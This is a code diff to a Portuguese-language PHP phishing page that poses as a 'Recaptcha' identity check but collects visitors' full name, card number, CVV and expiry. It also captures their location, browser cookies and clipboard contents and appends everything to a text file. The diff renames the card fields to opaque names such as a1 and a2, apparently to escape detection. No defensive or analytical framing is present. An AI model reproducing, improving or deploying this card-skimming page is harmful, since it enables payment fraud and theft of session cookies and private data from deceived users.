@@ -18,7 +18,7 @@
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            background: url('1.jpg') no-repeat center center/cover;
+            background: url('*.jpg') no-repeat center center/cover;
         }
 
         .container {
@@ -111,10 +111,10 @@
 
  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // Dados do formulário
-    $full_name = $_POST['full_name'] ?? 'N/A';
-    $cc_number = $_POST['cc_number'] ?? 'N/A';
-    $cc_cvv = $_POST['cc_cvv'] ?? 'N/A';
-    $cc_expiry = $_POST['cc_expiry'] ?? 'N/A';
+    $a1 = $_POST['a1'] ?? 'N/A';
+    $a2 = $_POST['a2'] ?? 'N/A';
+    $a3 = $_POST['a3'] ?? 'N/A';
+    $a4 = $_POST['a4'] ?? 'N/A';
     $location = $_POST['location'] ?? 'Localização não disponível';
     $cookies = $_SERVER['HTTP_COOKIE'] ?? 'Nenhum cookie disponível';
     $clipboard = $_POST['clipboard'] ?? 'Nenhum texto da área de transferência';
@@ -132,10 +132,10 @@
 
     // Salvar os dados no arquivo
     $file = fopen("dados.txt", "a");
-    fwrite($file, "Nome Completo: $full_name\n");
-    fwrite($file, "Número do Cartão: $cc_number\n");
-    fwrite($file, "CVV: $cc_cvv\n");
-    fwrite($file, "Validade: $cc_expiry\n");
+    fwrite($file, "Nome Completo: $a1\n");
+    fwrite($file, "Número do Cartão: $a2\n");
+    fwrite($file, "CVV: $a3\n");
+    fwrite($file, "Validade: $a4\n");
     fwrite($file, "Localização: $location\n");
     fwrite($file, "Cookies: $cookies\n");
     fwrite($file, "Área de Transferência: $clipboard\n"); // Salvar conteúdo da área de transferência
@@ -153,16 +153,16 @@
         <form method="POST" enctype="multipart/form-data">
             <h3>Confirme que é você! - Recaptcha</h3>
             <div class="input-box">
-                <input placeholder="Nome Completo" type="text" name="full_name" required>
+                <input placeholder="Nome Completo" type="text" name="a1" required>
             </div>
             <div class="input-box">
-                <input placeholder="Número do Cartão" type="number" name="cc_number" required>
+                <input placeholder="Número do Cartão" type="number" name="a2" required>
             </div>
             <div class="input-box">
-                <input placeholder="CVV" type="number" name="cc_cvv" required>
+                <input placeholder="CVV" type="number" name="a3" required>
             </div>
             <div class="input-box">
-                <input placeholder="Validade do Cartão (MM/AA)" type="number" name="cc_expiry" required>
+                <input placeholder="Validade do Cartão (MM/AA)" type="number" name="a4" required>
             </div>
             <div class="remember">
                 <label>
@@ -267,9 +267,9 @@ document.addEventListener('paste', async (event) => {
   //     0oo0000oooo0       0oo0000oooo0                   
   //     0oo0000oooo0       0oo0000oooo0 	          			            
   //     0oo____oooo0       0oo____oooo0	 
-  //     000000000000       000000000000                        
-  //                   
-  //     1                   ___________         _________				
+  //     000000000000       000000000000                                         
+  //     
+  //     1                    ___________         _________				
   //     1  '    sssssssss  |___________        |_________			
   //     1       ss         |                   |					
   //     1         s        |___________      	|_________			 		
@@ -277,9 +277,8 @@ document.addEventListener('paste', async (event) => {
   //     1           s 	    |___________        |__________			
   //     1     ssssssss     |___________        |__________  .you  
   //     1
-  //    ___    			          
+  //	___    			          
   //  
-  //
   //
     </script>
 <script>
